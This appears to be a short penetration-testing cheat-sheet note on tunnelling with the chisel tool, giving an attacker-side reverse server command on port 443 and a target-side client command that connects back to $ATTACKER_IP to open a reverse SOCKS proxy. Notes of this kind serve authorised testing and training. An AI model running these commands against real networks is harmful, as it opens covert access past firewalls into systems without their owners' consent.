# tunneling through chisel
https://github.com/jpillora/chisel
Tunnel through 443 and open a socks proxy on attacker localhost.
## Attacker
```bash
./chisel server --port 443 --reverse
```
## Target
```
./chisel client $ATTACKER_IP:443 R:socks
```

